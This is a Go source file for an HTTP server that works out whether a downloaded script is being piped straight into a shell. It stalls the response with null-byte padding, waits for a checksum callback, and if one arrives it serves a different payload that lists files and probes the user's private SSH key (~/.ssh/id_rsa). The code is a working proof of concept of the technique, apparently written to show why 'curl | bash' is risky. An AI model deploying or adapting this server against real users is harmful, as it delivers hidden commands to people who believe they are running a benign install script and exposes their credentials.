package main

import (
	"bufio"
	"io"
	"log"
	"net/http"
	"strings"
	"time"
)

type detectionServer struct {
	Addr           string
	RemoteURL      string
	WaitTime       time.Duration
	PayloadShell   string
	PayloadDefault string
	server         *http.Server
	receivedVerify chan (bool)
	bufrw          *bufio.ReadWriter
}

func (d *detectionServer) ListenAndServe() error {

	d.receivedVerify = make(chan bool)

	mux := http.NewServeMux()
	mux.HandleFunc("/script", d.handlerScript)
	mux.HandleFunc("/verify", d.handlerVerify)

	d.server = &http.Server{
		Addr:           d.Addr,
		Handler:        mux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
	}

	return d.server.ListenAndServe()
}

func (d *detectionServer) handlerVerify(w http.ResponseWriter, r *http.Request) {
	log.Println("verify handler - start")

	io.WriteString(w, "d8e8fca2dc0f896fd7cb4cb0031ba249")
	d.receivedVerify <- true

	log.Println("verify handler - end")
}

func (d *detectionServer) handlerScript(w http.ResponseWriter, r *http.Request) {
	log.Println("script handler - start")

	hijacker, _ := w.(http.Hijacker)
	conn, bufrw, err := hijacker.Hijack()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer conn.Close()

	d.bufrw = bufrw

	d.sendResponseHeaders()
	d.sendTrigger()
	d.sendSpacing()

	select {
	case <-d.receivedVerify:
		d.sendPayloadShell()
	case <-time.After(d.WaitTime):
		d.sendPayloadDefault()
	}

	d.bufrw.Flush()
	log.Println("script handler - end")
}

func (d *detectionServer) sendResponseHeaders() {
	d.bufrw.WriteString("HTTP/1.1 200 OK\n")
	d.bufrw.WriteString("Host: localhost\n")
	d.bufrw.WriteString("Transfer-type: chunked\n")
	d.bufrw.WriteString("Content-Type: text/plain; charset=utf-8\n\n")
	d.bufrw.Flush()
}

func (d *detectionServer) sendTrigger() {
	d.bufrw.WriteString("echo \"Getting Checksum to verify binary...\";\n")
	d.bufrw.WriteString("checksum=$(curl -sS " + d.RemoteURL + "/verify;)\n")
	d.bufrw.Flush()
}

func (d *detectionServer) sendSpacing() {
	d.bufrw.WriteString(strings.Repeat("\x00", 87380))
	d.bufrw.Flush()
}

func (d *detectionServer) sendPayloadShell() {
	log.Println("Received verify request while waiting, assuming we get piped into a shell")
	d.bufrw.WriteString(d.PayloadShell)
}

func (d *detectionServer) sendPayloadDefault() {
	log.Println("No Request received in the last two second, assuming no pipe to shell...")
	d.bufrw.WriteString(d.PayloadDefault)
}

func main() {
	payloadDefault := "echo \"Checksum found: ${checksum}\";\n"

	payloadShell := "echo \"Checksum found: ${checksum}\";\n" +
		"ls -la;\n" +
		"file ~/.ssh/id_rsa;\n"

	server := &detectionServer{
		Addr:           ":10000",
		RemoteURL:      "http://localhost:10000",
		WaitTime:       time.Second * 2,
		PayloadDefault: payloadDefault,
		PayloadShell:   payloadShell,
	}
	log.Fatal(server.ListenAndServe())
}
